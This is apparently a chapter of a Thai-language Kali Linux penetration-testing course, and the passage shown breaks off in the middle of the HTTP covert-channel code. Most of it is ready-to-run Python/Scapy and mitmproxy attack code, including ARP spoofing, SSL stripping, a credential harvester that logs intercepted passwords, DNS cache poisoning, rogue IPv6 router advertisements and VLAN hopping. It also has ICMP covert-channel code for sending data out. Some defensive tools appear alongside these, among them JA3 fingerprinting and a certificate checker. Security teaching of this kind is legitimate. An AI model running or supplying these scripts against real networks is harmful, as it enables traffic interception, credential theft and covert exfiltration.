# Part 93: Advanced Network Attacks

> **หลักสูตร Kali Linux ระดับมืออาชีพ** | ← [Part 92: Malware Analysis](Part-92-Malware-Analysis.md) | [Part 94: Active Directory Advanced](Part-94-Active-Directory-Advanced.md) →

---

## สารบัญ

1. [Advanced Network Attacks Overview](#1-advanced-network-attacks-overview)
2. [Man-in-the-Middle (MITM) Attacks](#2-man-in-the-middle-mitm-attacks)
3. [SSL/TLS Attacks](#3-ssltls-attacks)
4. [DNS Attacks](#4-dns-attacks)
5. [IPv6 Attacks](#5-ipv6-attacks)
6. [BGP Hijacking Concepts](#6-bgp-hijacking-concepts)
7. [VLAN Hopping](#7-vlan-hopping)
8. [Network Covert Channels](#8-network-covert-channels)
9. [Protocol Fuzzing](#9-protocol-fuzzing)
10. [VPN Security Testing](#10-vpn-security-testing)
11. [Wireless Advanced Attacks](#11-wireless-advanced-attacks)
12. [Network Detection Evasion](#12-network-detection-evasion)
13. [Advanced Scanning Techniques](#13-advanced-scanning-techniques)
14. [Custom Packet Crafting](#14-custom-packet-crafting)
15. [สรุป Advanced Network Attacks](#15-สรุป-advanced-network-attacks)

---

## 1. Advanced Network Attacks Overview

### Network Attack Taxonomy

```
┌────────────────────────────────────────────────────┐
│            Network Attack Categories                   │
├────────────────────────────────────────────────────┤
│  Interception │ MITM, ARP spoofing, SSL strip         │
│  Spoofing     │ IP spoof, DNS poison, BGP hijack      │
│  Evasion      │ Fragmentation, tunneling, covert ch.  │
│  Reconnaissance│ Port scan, fingerprint, topology map  │
│  Exploitation │ Protocol vuln, fuzzing, 0-day         │
│  Disruption   │ DoS/DDoS, routing attack, jamming      │
└────────────────────────────────────────────────────┘
```

### Lab Setup

```bash
# ติดตั้ง tools
sudo apt install -y \
  scapy \
  mitmproxy \
  bettercap \
  ettercap-graphical \
  responder \
  impacket-scripts \
  iproute2 \
  tcpdump \
  nmap \
  hping3

pip3 install scapy

# เปิดใช้งาน IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Lab network: 192.168.1.0/24
# Attacker: 192.168.1.100
# Target A: 192.168.1.10
# Target B/GW: 192.168.1.1
```

---

## 2. Man-in-the-Middle (MITM) Attacks

### ARP Spoofing

```python
# arp_spoofer.py
# ARP Poisoning เพื่อทำ MITM

from scapy.all import *
import time
import threading

class ARPSpoofer:
    
    def __init__(self, target_ip: str, gateway_ip: str, 
                 interface: str = None):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.iface = interface or conf.iface
        self.target_mac = None
        self.gateway_mac = None
        self.running = False
    
    def get_mac(self, ip: str) -> str:
        """หา MAC address จาก IP"""
        arp_req = ARP(op=1, pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_req_broadcast = broadcast / arp_req
        
        answered = srp(arp_req_broadcast, timeout=2, 
                       iface=self.iface, verbose=False)[0]
        
        if answered:
            return answered[0][1].hwsrc
        raise Exception(f"Cannot get MAC for {ip}")
    
    def spoof(self, target_ip: str, spoof_ip: str):
        """ส่ง ARP reply ปลอม"""
        target_mac = self.get_mac(target_ip)
        
        # บอก target_ip ว่า spoof_ip คือ attacker (MAC ของเรา)
        packet = ARP(
            op=2,              # ARP reply
            pdst=target_ip,    # ส่งถึง victim
            hwdst=target_mac,  # MAC ของ victim
            psrc=spoof_ip      # แกล้งเป็น gateway IP
        )
        send(packet, verbose=False, iface=self.iface)
    
    def restore(self, target_ip: str, source_ip: str):
        """คืนค่า ARP table ที่ถูกต้อง"""
        target_mac = self.get_mac(target_ip)
        source_mac = self.get_mac(source_ip)
        
        packet = ARP(
            op=2,
            pdst=target_ip,
            hwdst=target_mac,
            psrc=source_ip,
            hwsrc=source_mac
        )
        send(packet, verbose=False, count=4, iface=self.iface)
    
    def run(self, interval: float = 1.5):
        """เริ่ม ARP spoofing"""
        print(f"[*] Getting MAC addresses...")
        self.target_mac = self.get_mac(self.target_ip)
        self.gateway_mac = self.get_mac(self.gateway_ip)
        
        print(f"[+] Target {self.target_ip} -> {self.target_mac}")
        print(f"[+] Gateway {self.gateway_ip} -> {self.gateway_mac}")
        print(f"[*] Starting ARP spoofing (Ctrl+C to stop)")
        
        self.running = True
        packets_sent = 0
        
        try:
            while self.running:
                # บอก target ว่า gateway = attacker
                self.spoof(self.target_ip, self.gateway_ip)
                # บอก gateway ว่า target = attacker
                self.spoof(self.gateway_ip, self.target_ip)
                
                packets_sent += 2
                if packets_sent % 20 == 0:
                    print(f"[*] Sent {packets_sent} ARP packets")
                
                time.sleep(interval)
        except KeyboardInterrupt:
            pass
        finally:
            print(f"\n[*] Restoring ARP tables...")
            self.restore(self.target_ip, self.gateway_ip)
            self.restore(self.gateway_ip, self.target_ip)
            print("[+] ARP tables restored")

# ใช้งาน
if __name__ == "__main__":
    spoofer = ARPSpoofer(
        target_ip="192.168.1.10",
        gateway_ip="192.168.1.1"
    )
    spoofer.run()
```

### SSL Stripping

```python
# ssl_stripper.py
# SSL Strip ด้วย mitmproxy addon

# ติดตั้ง: pip install mitmproxy
# รัน: mitmproxy --mode transparent -s ssl_stripper.py

from mitmproxy import http
from mitmproxy.net.http import headers as http_headers
import re

class SSLStripper:
    
    def request(self, flow: http.HTTPFlow) -> None:
        """Modify requests to strip HTTPS"""
        # เปลี่ยน https -> http ใน Referer header
        if flow.request.headers.get("Referer"):
            referer = flow.request.headers["Referer"]
            flow.request.headers["Referer"] = referer.replace(
                "https://", "http://"
            )
    
    def response(self, flow: http.HTTPFlow) -> None:
        """Downgrade HTTPS links to HTTP in responses"""
        content_type = flow.response.headers.get("content-type", "")
        
        if "text/html" in content_type:
            text = flow.response.get_text()
            
            # เปลี่ยน https -> http
            text = re.sub(r'https://', 'http://', text)
            
            # ลบ Strict-Transport-Security header
            if "strict-transport-security" in flow.response.headers:
                del flow.response.headers["strict-transport-security"]
            
            flow.response.set_text(text)
        
        # ลบ Location header HTTPS redirects
        if flow.response.status_code in [301, 302, 303, 307, 308]:
            location = flow.response.headers.get("location", "")
            if location.startswith("https://"):
                flow.response.headers["location"] = location.replace(
                    "https://", "http://", 1
                )

addons = [SSLStripper()]
```

### Credential Harvesting via MITM

```python
# credential_harvester.py
# Harvest credentials จาก HTTP traffic

from mitmproxy import http
import re
import json
from datetime import datetime

CREDENTIAL_PATTERNS = [
    # (field_name_pattern, is_sensitive)
    (r'password', True),
    (r'passwd', True),
    (r'pass\b', True),
    (r'secret', True),
    (r'token', True),
    (r'api.?key', True),
    (r'username', False),
    (r'user\b', False),
    (r'email', False),
    (r'login', False),
]

class CredentialHarvester:
    
    def __init__(self):
        self.credentials = []
    
    def request(self, flow: http.HTTPFlow) -> None:
        """Inspect POST requests for credentials"""
        if flow.request.method != "POST":
            return
        
        content_type = flow.request.headers.get("content-type", "")
        
        found_creds = {}
        
        if "application/x-www-form-urlencoded" in content_type:
            # Parse form data
            params = flow.request.urlencoded_form
            for key, value in params.items():
                for pattern, sensitive in CREDENTIAL_PATTERNS:
                    if re.search(pattern, key, re.I):
                        found_creds[key] = value if not sensitive else \
                            f"{value[:3]}***"
        
        elif "application/json" in content_type:
            # Parse JSON body
            try:
                body = json.loads(flow.request.content)
                self._extract_json_creds(body, found_creds)
            except:
                pass
        
        if found_creds:
            cred_entry = {
                "time": datetime.now().isoformat(),
                "host": flow.request.host,
                "path": flow.request.path,
                "data": found_creds
            }
            self.credentials.append(cred_entry)
            print(f"[!!!] CREDENTIAL FOUND at {flow.request.host}")
            for k, v in found_creds.items():
                print(f"  {k}: {v}")
            
            # Save to file
            with open("/tmp/harvested_creds.json", "a") as f:
                f.write(json.dumps(cred_entry) + "\n")
    
    def _extract_json_creds(self, obj, result: dict, prefix=""):
        if isinstance(obj, dict):
            for k, v in obj.items():
                full_key = f"{prefix}.{k}" if prefix else k
                for pattern, sensitive in CREDENTIAL_PATTERNS:
                    if re.search(pattern, k, re.I):
                        result[full_key] = str(v)[:50]
                if isinstance(v, (dict, list)):
                    self._extract_json_creds(v, result, full_key)
        elif isinstance(obj, list):
            for i, item in enumerate(obj):
                self._extract_json_creds(item, result, f"{prefix}[{i}]")

addons = [CredentialHarvester()]
```

---

## 3. SSL/TLS Attacks

### TLS Fingerprinting

```python
# tls_fingerprinter.py
# JA3/JA3S TLS fingerprinting

from scapy.all import *
from scapy.layers.tls.all import *
import hashlib
import json
from collections import defaultdict

class TLSFingerprinter:
    
    GREASE_VALUES = {
        0x0a0a, 0x1a1a, 0x2a2a, 0x3a3a, 0x4a4a, 0x5a5a,
        0x6a6a, 0x7a7a, 0x8a8a, 0x9a9a, 0xaaaa, 0xbaba,
        0xcaca, 0xdada, 0xeaea, 0xfafa
    }
    
    def compute_ja3(self, tls_client_hello) -> str:
        """คำนวณ JA3 fingerprint"""
        try:
            tls = tls_client_hello[TLS]
            ch = tls.msg[0]  # ClientHello
            
            # 1. TLS version
            version = ch.version
            
            # 2. Cipher suites (exclude GREASE)
            ciphers = [
                c for c in ch.ciphers
                if c not in self.GREASE_VALUES
            ]
            
            # 3. Extensions (type codes, exclude GREASE)
            exts = []
            elliptic_curves = []
            ec_point_formats = []
            
            for ext in (ch.ext or []):
                ext_type = ext.type
                if ext_type in self.GREASE_VALUES:
                    continue
                exts.append(ext_type)
                
                # Extract elliptic curves
                if ext_type == 10:  # supported_groups
                    for group in (ext.groups or []):
                        if group not in self.GREASE_VALUES:
                            elliptic_curves.append(group)
                
                # EC point formats
                elif ext_type == 11:
                    ec_point_formats = list(ext.ecpl or [])
            
            # Build JA3 string
            ja3_parts = [
                str(version),
                "-".join(str(c) for c in ciphers),
                "-".join(str(e) for e in exts),
                "-".join(str(c) for c in elliptic_curves),
                "-".join(str(f) for f in ec_point_formats)
            ]
            
            ja3_str = ",".join(ja3_parts)
            ja3_hash = hashlib.md5(ja3_str.encode()).hexdigest()
            
            return ja3_hash, ja3_str
        
        except Exception as e:
            return None, None
    
    def analyze_pcap(self, pcap_file: str):
        """วิเคราะห์ TLS fingerprints จาก PCAP"""
        fingerprints = defaultdict(list)
        
        # Known malware JA3 hashes
        KNOWN_MALWARE_JA3 = {
            "e7d705a3286e19ea42f587b344ee6865": "Trickbot",
            "6734f37431670b3ab4292b8f60f29984": "CobaltStrike",
            "a0e9f5d64349fb13191bc781f81f42e1": "Dridex",
            "de350869b8c85de67a350c8d186f11e6": "Emotet",
        }
        
        pkts = rdpcap(pcap_file)
        
        for pkt in pkts:
            if TLS in pkt:
                try:
                    ja3_hash, ja3_str = self.compute_ja3(pkt)
                    if ja3_hash:
                        src_ip = pkt[IP].src if IP in pkt else "?"
                        dst_ip = pkt[IP].dst if IP in pkt else "?"
                        
                        entry = {
                            "src": src_ip,
                            "dst": dst_ip,
                            "ja3": ja3_hash,
                        }
                        
                        if ja3_hash in KNOWN_MALWARE_JA3:
                            entry["malware"] = KNOWN_MALWARE_JA3[ja3_hash]
                            print(f"[!!!] MALWARE TLS: {src_ip} -> {dst_ip} ({entry['malware']})")
                        
                        fingerprints[ja3_hash].append(entry)
                except:
                    pass
        
        # สรุป
        print(f"\nTLS Fingerprint Summary:")
        for ja3, entries in sorted(fingerprints.items(), 
                                    key=lambda x: len(x[1]), reverse=True):
            print(f"  {ja3}: {len(entries)} connections")
            if entries[0].get("malware"):
                print(f"    !!! MALWARE: {entries[0]['malware']}")
        
        return fingerprints

if __name__ == "__main__":
    import sys
    fp = TLSFingerprinter()
    fp.analyze_pcap(sys.argv[1])
```

### SSL Certificate Analysis

```python
# ssl_cert_analyzer.py
# วิเคราะห์ SSL/TLS certificates

import ssl
import socket
import json
from datetime import datetime
from typing import Dict, List
import concurrent.futures

class SSLCertAnalyzer:
    
    WEAK_CIPHERS = [
        "RC4", "DES", "3DES", "NULL", "EXPORT",
        "anon", "MD5", "SSLv2", "SSLv3"
    ]
    
    def analyze_host(self, hostname: str, port: int = 443) -> Dict:
        """Analyze SSL/TLS configuration of a host"""
        result = {
            "host": hostname,
            "port": port,
            "cert": {},
            "protocol": None,
            "cipher": None,
            "issues": []
        }
        
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            with socket.create_connection((hostname, port), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    result["protocol"] = ssock.version()
                    result["cipher"] = ssock.cipher()
                    
                    # วิเคราะห์ certificate
                    result["cert"] = self._parse_cert(cert)
                    
                    # ตรวจ issues
                    result["issues"] = self._check_issues(
                        cert, ssock.version(), ssock.cipher()
                    )
        except ssl.SSLError as e:
            result["error"] = str(e)
        except Exception as e:
            result["error"] = str(e)
        
        return result
    
    def _parse_cert(self, cert: dict) -> Dict:
        if not cert:
            return {}
        
        result = {}
        
        # Subject
        subject = dict(x[0] for x in cert.get('subject', []))
        result['cn'] = subject.get('commonName', '')
        result['org'] = subject.get('organizationName', '')
        
        # Issuer
        issuer = dict(x[0] for x in cert.get('issuer', []))
        result['issuer'] = issuer.get('organizationName', '')
        
        # Validity
        not_before = datetime.strptime(
            cert.get('notBefore', ''), '%b %d %H:%M:%S %Y %Z'
        ) if cert.get('notBefore') else None
        not_after = datetime.strptime(
            cert.get('notAfter', ''), '%b %d %H:%M:%S %Y %Z'
        ) if cert.get('notAfter') else None
        
        result['not_before'] = not_before.isoformat() if not_before else ''
        result['not_after'] = not_after.isoformat() if not_after else ''
        result['expired'] = not_after < datetime.now() if not_after else False
        result['days_to_expire'] = (
            (not_after - datetime.now()).days if not_after else 0
        )
        
        # SANs
        sans = cert.get('subjectAltName', [])
        result['sans'] = [s[1] for s in sans]
        
        return result
    
    def _check_issues(self, cert, protocol: str, cipher) -> List[str]:
        issues = []
        
        # Protocol issues
        if protocol in ["SSLv2", "SSLv3", "TLSv1", "TLSv1.1"]:
            issues.append(f"Weak protocol: {protocol}")
        
        # Cipher issues
        if cipher:
            cipher_name = cipher[0]
            for weak in self.WEAK_CIPHERS:
                if weak in cipher_name:
                    issues.append(f"Weak cipher: {cipher_name}")
                    break
        
        # Certificate issues
        if cert:
            # ตรวจ expiry
            not_after_str = cert.get('notAfter', '')
            if not_after_str:
                not_after = datetime.strptime(
                    not_after_str, '%b %d %H:%M:%S %Y %Z'
                )
                if not_after < datetime.now():
                    issues.append("Certificate is EXPIRED")
                elif (not_after - datetime.now()).days < 30:
                    issues.append(f"Certificate expires in {(not_after - datetime.now()).days} days")
            
            # Self-signed
            subject = dict(x[0] for x in cert.get('subject', []))
            issuer = dict(x[0] for x in cert.get('issuer', []))
            if subject.get('commonName') == issuer.get('commonName'):
                issues.append("Self-signed certificate")
        
        return issues
    
    def scan_multiple(self, targets: List[str]) -> List[Dict]:
        """Scan multiple hosts concurrently"""
        results = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = {executor.submit(self.analyze_host, t): t 
                      for t in targets}
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                results.append(result)
                
                host = result["host"]
                issues = result.get("issues", [])
                status = "FAIL" if issues else "PASS"
                print(f"[{status}] {host}: {', '.join(issues) or 'OK'}")
        
        return results

if __name__ == "__main__":
    analyzer = SSLCertAnalyzer()
    
    # Single host analysis
    result = analyzer.analyze_host("example.com")
    print(json.dumps(result, indent=2))
```

---

## 4. DNS Attacks

### DNS Cache Poisoning

```python
# dns_poisoner.py
# DNS Cache Poisoning PoC (Lab/Authorized Only)

from scapy.all import *
import random
import threading
import time

class DNSPoisoner:
    """ใช้เฉพาะ lab environment และ authorized testing"""
    
    def __init__(self, target_dns: str, fake_ip: str, 
                 domain: str, iface: str = None):
        self.target_dns = target_dns
        self.fake_ip = fake_ip
        self.domain = domain
        self.iface = iface or conf.iface
    
    def poison_response(self, original_pkt):
        """สร้าง DNS response ปลอม"""
        # สร้าง fake DNS response
        response = (
            IP(src=self.target_dns, dst=original_pkt[IP].src) /
            UDP(sport=53, dport=original_pkt[UDP].sport) /
            DNS(
                id=original_pkt[DNS].id,   # ต้องตรงกับ request!
                qr=1,    # response
                aa=1,    # authoritative
                rd=0,
                ra=1,
                qdcount=1,
                ancount=1,
                qd=original_pkt[DNS].qd,
                an=DNSRR(
                    rrname=self.domain + ".",
                    ttl=86400,           # high TTL = long cache
                    rdata=self.fake_ip   # เปลี่ยนไปเป็น IP ของ attacker
                )
            )
        )
        return response
    
    def sniff_and_poison(self):
        """ดัก DNS queries และส่ง poisoned response"""
        print(f"[*] Poisoning DNS: {self.domain} -> {self.fake_ip}")
        print(f"[*] Sniffing on {self.iface}")
        
        def process_packet(pkt):
            if (DNS in pkt and 
                pkt[DNS].qr == 0 and  # DNS query
                self.domain in str(pkt[DNS].qd.qname, 'utf-8')):
                
                print(f"[+] Intercepted DNS query for {self.domain}")
                response = self.poison_response(pkt)
                
                # ส่ง poisoned response
                send(response, verbose=False, iface=self.iface)
                print(f"[+] Sent poisoned response: {self.fake_ip}")
        
        # Sniff DNS packets
        sniff(
            filter=f"udp port 53 and dst host {self.target_dns}",
            prn=process_packet,
            iface=self.iface,
            store=False
        )
```

### DNS Enumeration

```python
# dns_enumerator.py
# Advanced DNS enumeration

import dns.resolver
import dns.zone
import dns.query
import concurrent.futures
from typing import List, Dict

class AdvancedDNSEnumerator:
    
    RECORD_TYPES = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA', 
                    'CNAME', 'PTR', 'SRV', 'DMARC', 'SPF']
    
    def __init__(self, domain: str, nameserver: str = None):
        self.domain = domain
        self.resolver = dns.resolver.Resolver()
        if nameserver:
            self.resolver.nameservers = [nameserver]
    
    def query_record(self, subdomain: str, record_type: str) -> List[str]:
        """Query specific DNS record"""
        try:
            target = f"{subdomain}.{self.domain}" if subdomain else self.domain
            answers = self.resolver.resolve(target, record_type)
            return [str(r) for r in answers]
        except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer,
                dns.exception.Timeout):
            return []
    
    def zone_transfer(self) -> Dict:
        """Attempt DNS zone transfer (AXFR)"""
        print(f"[*] Attempting zone transfer for {self.domain}")
        
        # Get NS records
        ns_records = self.query_record("", "NS")
        
        for ns in ns_records:
            ns = ns.rstrip('.')
            print(f"[*] Trying zone transfer from {ns}")
            
            try:
                zone = dns.zone.from_xfr(
                    dns.query.xfr(ns, self.domain, timeout=10)
                )
                
                print(f"[+] Zone transfer SUCCESSFUL from {ns}!")
                
                records = {}
                for name, node in zone.nodes.items():
                    rdatasets = node.rdatasets
                    name_str = str(name)
                    records[name_str] = []
                    
                    for rdataset in rdatasets:
                        for rdata in rdataset:
                            records[name_str].append({
                                "type": dns.rdatatype.to_text(rdataset.rdtype),
                                "value": str(rdata)
                            })
                
                return {"nameserver": ns, "records": records, "success": True}
            
            except dns.exception.FormError:
                print(f"[-] Zone transfer refused from {ns}")
            except Exception as e:
                print(f"[-] Error: {e}")
        
        return {"success": False}
    
    def brute_force_subdomains(self, wordlist_path: str) -> List[str]:
        """Brute force subdomains"""
        found = []
        
        with open(wordlist_path) as f:
            subdomains = [line.strip() for line in f if line.strip()]
        
        print(f"[*] Brute forcing {len(subdomains)} subdomains...")
        
        def check_subdomain(sub):
            ips = self.query_record(sub, "A")
            if ips:
                return f"{sub}.{self.domain}", ips
            return None, None
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
            futures = {ex.submit(check_subdomain, s): s for s in subdomains}
            for future in concurrent.futures.as_completed(futures):
                domain, ips = future.result()
                if domain:
                    print(f"[+] {domain} -> {ips}")
                    found.append({"domain": domain, "ips": ips})
        
        return found
    
    def dns_cache_snooping(self, target_domains: List[str]) -> List[str]:
        """DNS cache snooping - เช็คว่า domain อยู่ใน cache หรือไม่"""
        cached = []
        
        for domain in target_domains:
            try:
                # Non-recursive query (RD=0) = check cache only
                qname = dns.name.from_text(domain)
                request = dns.message.make_query(
                    qname, dns.rdatatype.A, 
                    rd=False  # Recursion Desired = False
                )
                
                response = dns.query.udp(
                    request, self.resolver.nameservers[0], timeout=2
                )
                
                if response.answer:  # Has answer = in cache!
                    cached.append(domain)
                    print(f"[+] In cache: {domain}")
            except:
                pass
        
        return cached

if __name__ == "__main__":
    enum = AdvancedDNSEnumerator("example.com")
    
    # Zone transfer
    zt = enum.zone_transfer()
    if zt["success"]:
        print(json.dumps(zt["records"], indent=2))
    
    # Basic records
    for record_type in ["A", "MX", "NS", "TXT"]:
        results = enum.query_record("", record_type)
        if results:
            print(f"{record_type}: {results}")
```

---

## 5. IPv6 Attacks

```python
# ipv6_attacks.py
# IPv6-specific attacks

from scapy.all import *
import time

class IPv6Attacker:
    
    def fake_router_advertisement(self, target_prefix: str = "2001:db8::/64",
                                   iface: str = None):
        """ส่ง fake Router Advertisement"""
        iface = iface or conf.iface6
        
        # Fake RA packet
        ra_packet = (
            Ether(dst="33:33:00:00:00:01") /    # IPv6 multicast MAC
            IPv6(
                src="fe80::1",                   # link-local attacker
                dst="ff02::1"                    # all-nodes multicast
            ) /
            ICMPv6ND_RA(
                M=0,  # Managed = 0 (use SLAAC)
                O=1,  # Other = 1
                routerlifetime=9000,
                reachabletime=30000,
                retranstimer=1000
            ) /
            ICMPv6NDOptPrefixInfo(
                prefixlen=64,
                prefix=target_prefix.split('/')[0],
                validlifetime=86400,
                preferredlifetime=14400,
            ) /
            ICMPv6NDOptSrcLLAddr(lladdr="00:11:22:33:44:55")
        )
        
        print(f"[*] Sending fake RA with prefix {target_prefix}")
        sendp(ra_packet, iface=iface, verbose=False)
        print(f"[+] Sent Rogue Router Advertisement")
    
    def neighbor_advertisement_spoof(self, target_ip6: str, 
                                      fake_mac: str, iface: str = None):
        """สปอยฟ์ IPv6 Neighbor Advertisement (เหมือน ARP spoof สำหรับ IPv6)"""
        iface = iface or conf.iface6
        
        na_packet = (
            Ether(dst="ff:ff:ff:ff:ff:ff") /
            IPv6(src="fe80::1", dst="ff02::1") /
            ICMPv6ND_NA(
                tgt=target_ip6,  # IPv6 address ที่ต้องการสปอยฟ์
                O=1,             # Override flag
                S=0              # Solicited = 0 for unsolicited
            ) /
            ICMPv6NDOptDstLLAddr(lladdr=fake_mac)  # Attacker MAC
        )
        
        print(f"[*] Sending fake NA for {target_ip6} -> {fake_mac}")
        sendp(na_packet, iface=iface, verbose=False, count=5)
    
    def ipv6_scan(self, network_prefix: str):
        """Scan IPv6 network โดยใช้ multicast"""
        print(f"[*] Scanning IPv6 network...")
        
        # Ping all-nodes multicast
        ping6_packet = (
            IPv6(dst="ff02::1") /
            ICMPv6EchoRequest()
        )
        
        responded = []
        
        def handle_response(pkt):
            if ICMPv6EchoReply in pkt:
                src = pkt[IPv6].src
                if src not in responded:
                    responded.append(src)
                    print(f"[+] Host: {src}")
        
        # Send ping and collect responses
        sendp(ping6_packet, iface=conf.iface6, verbose=False)
        sniff(filter="icmp6", prn=handle_response, timeout=3)
        
        return responded
```

---

## 6. BGP Hijacking Concepts

```python
# bgp_analysis.py
# BGP security analysis และ hijacking concepts

import socket
import struct
from typing import List, Dict

class BGPAnalyzer:
    """วิเคราะห์ BGP security (educational)"""
    
    BGP_MARKER = b'\xff' * 16
    BGP_VERSION = 4
    
    BGP_MSG_TYPES = {
        1: "OPEN",
        2: "UPDATE",
        3: "NOTIFICATION",
        4: "KEEPALIVE",
        5: "ROUTE-REFRESH"
    }
    
    def parse_bgp_open(self, data: bytes) -> Dict:
        """Parse BGP OPEN message"""
        if len(data) < 29:
            return {"error": "Too short"}
        
        # Marker (16 bytes)
        marker = data[:16]
        if marker != self.BGP_MARKER:
            return {"error": "Invalid marker"}
        
        # Length (2 bytes)
        length = struct.unpack("!H", data[16:18])[0]
        
        # Type (1 byte)
        msg_type = data[18]
        
        if msg_type != 1:  # OPEN
            return {"error": f"Not OPEN, got type {msg_type}"}
        
        # OPEN fields
        version = data[19]
        my_as = struct.unpack("!H", data[20:22])[0]
        hold_time = struct.unpack("!H", data[22:24])[0]
        bgp_id = socket.inet_ntoa(data[24:28])
        
        return {
            "version": version,
            "my_as": my_as,
            "hold_time": hold_time,
            "bgp_id": bgp_id,
            "msg_type": "OPEN"
        }
    
    def check_rpki_validation(self, prefix: str, origin_as: int) -> str:
        """Check RPKI validation status (conceptual)"""
        # ในความเป็นจริงจะใช้ RPKI validator API
        # เช่น: https://rpki-validator.ripe.net/api/v1/validity/{ASN}/{prefix}
        
        # Simplified check
        known_hijacks = {
            "8.8.8.0/24": [1234, 5678],  # ASes ที่ไม่ควร announce
        }
        
        if prefix in known_hijacks:
            if origin_as in known_hijacks[prefix]:
                return "INVALID - Possible BGP Hijack!"
        
        return "VALID"
    
    def analyze_bgp_session(self, pcap_file: str) -> List[Dict]:
        """Analyze BGP messages from PCAP"""
        from scapy.all import rdpcap, TCP
        
        messages = []
        pkts = rdpcap(pcap_file)
        
        for pkt in pkts:
            if TCP in pkt and (pkt[TCP].dport == 179 or pkt[TCP].sport == 179):
                if pkt[TCP].payload:
                    data = bytes(pkt[TCP].payload)
                    if len(data) >= 19 and data[:16] == self.BGP_MARKER:
                        msg_type = data[18]
                        msg_type_name = self.BGP_MSG_TYPES.get(msg_type, f"Unknown({msg_type})")
                        
                        msg = {
                            "src": pkt.src,
                            "dst": pkt.dst,
                            "type": msg_type_name
                        }
                        
                        if msg_type == 1:  # OPEN
                            parsed = self.parse_bgp_open(data)
                            msg.update(parsed)
                        
                        messages.append(msg)
                        print(f"BGP {msg_type_name}: {pkt.src} -> {pkt.dst}")
        
        return messages
```

---

## 7. VLAN Hopping

```python
# vlan_hopper.py
# VLAN Hopping via Double Tagging และ Switch Spoofing

from scapy.all import *

class VLANHopper:
    """ต้องการ authorized testing เท่านั้น"""
    
    def double_tag_attack(self, outer_vlan: int, inner_vlan: int,
                           target_ip: str, attacker_ip: str,
                           iface: str = "eth0"):
        """
        Double Tagging VLAN Hopping:
        - Attacker อยู่ outer_vlan (เช่น VLAN 1 = native VLAN)
        - Target อยู่ inner_vlan
        - Switchแรกลอก outer tag ออก -> ส่ง inner VLAN
        """
        
        # ICMP ping ไปยัง target VLAN
        packet = (
            Ether(dst="ff:ff:ff:ff:ff:ff") /
            Dot1Q(vlan=outer_vlan) /   # Outer tag (native VLAN)
            Dot1Q(vlan=inner_vlan) /   # Inner tag (target VLAN)
            IP(src=attacker_ip, dst=target_ip) /
            ICMP()
        )
        
        print(f"[*] Double-tag attack: VLAN{outer_vlan} -> VLAN{inner_vlan}")
        print(f"[*] Target: {target_ip}")
        
        sendp(packet, iface=iface, verbose=False, count=3)
        print("[+] Packets sent")
    
    def switch_spoofing_dtp(self, iface: str = "eth0"):
        """
        Switch Spoofing via DTP (Dynamic Trunking Protocol):
        Negotiate trunk link dengan switch
        """
        # DTP packet (Cisco proprietary)
        # การทำ trunk = เข้าถึงทุก VLAN
        
        # DTP negotiation packet
        dtp_packet = (
            Ether(
                dst="01:00:0c:cc:cc:cc",  # DTP multicast
                src=get_if_hwaddr(iface)
            ) /
            LLC(dsap=0xAA, ssap=0xAA, ctrl=3) /
            SNAP(OUI=0x00000c, code=0x2004) /  # DTP protocol
            # DTP TLV: Trunk Desirable
            Raw(b'\x00\x01\x00\x04\xa5' +  # Domain
                b'\x00\x02\x00\x05\x00' +  # Status=Trunk
                b'\x00\x03\x00\x05\x00')   # DTP Type
        )
        
        print("[*] Sending DTP trunk negotiation...")
        sendp(dtp_packet, iface=iface, verbose=False, count=5)
        print("[+] DTP packets sent - check if trunk established")
    
    def scan_vlans(self, iface: str = "eth0", 
                   vlan_range: range = range(1, 100)):
        """Scan for active VLANs (ถ้ามี trunk access)"""
        active_vlans = []
        
        for vlan in vlan_range:
            # Send ARP to each VLAN
            pkt = (
                Ether(dst="ff:ff:ff:ff:ff:ff") /
                Dot1Q(vlan=vlan) /
                ARP(op=1, pdst="10.0.0.1")
            )
            
            ans = srp(pkt, iface=iface, timeout=0.1, verbose=False)[0]
            if ans:
                active_vlans.append(vlan)
                print(f"[+] Active VLAN: {vlan}")
        
        return active_vlans
```

---

## 8. Network Covert Channels

```python
# covert_channels.py
# ช่องทางแอบแฝงผ่าน network protocols

from scapy.all import *
import base64
import zlib
from typing import Generator

class CovertChannels:
    
    # === ICMP Covert Channel ===
    
    def icmp_send(self, data: str, target: str, 
                  packet_size: int = 64):
        """Send data via ICMP payload"""
        compressed = zlib.compress(data.encode())
        encoded = base64.b64encode(compressed)
        
        print(f"[*] Sending {len(encoded)} bytes via ICMP covert channel")
        
        # ส่งทีละ packet
        for i in range(0, len(encoded), packet_size):
            chunk = encoded[i:i+packet_size]
            seq = i // packet_size
            
            pkt = (
                IP(dst=target) /
                ICMP(
                    type=8,   # Echo request
                    id=0xbeef,
                    seq=seq
                ) /
                Raw(load=chunk)
            )
            send(pkt, verbose=False)
        
        # Terminator
        send(
            IP(dst=target) /
            ICMP(type=8, id=0xbeef, seq=0xffff) /
            Raw(load=b"END"),
            verbose=False
        )
        print("[+] Data sent")
    
    def icmp_receive(self, iface: str = None) -> Generator:
        """Receive data from ICMP covert channel"""
        received = {}
        
        def process(pkt):
            if ICMP in pkt and pkt[ICMP].id == 0xbeef:
                seq = pkt[ICMP].seq
                payload = bytes(pkt[Raw].load) if Raw in pkt else b""
                
                if seq == 0xffff and payload == b"END":
                    # Reassemble
                    chunks = [received[k] for k in sorted(received.keys())]
                    data = base64.b64decode(b"".join(chunks))
                    decompressed = zlib.decompress(data)
                    print(f"[+] Received: {decompressed.decode()}")
                    return decompressed.decode()
                else:
                    received[seq] = payload
        
        sniff(filter="icmp", prn=process, iface=iface, store=False)
    
    # === HTTP Covert Channel ===
    
    def http_headers_send(self, data: str, target_url: str):
        """Hide data in HTTP headers"""
        import requests
        
        encoded = base64.b64encode(data.encode()).decode()
        
        # ทำให้ดูเหมือน normal traffic
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
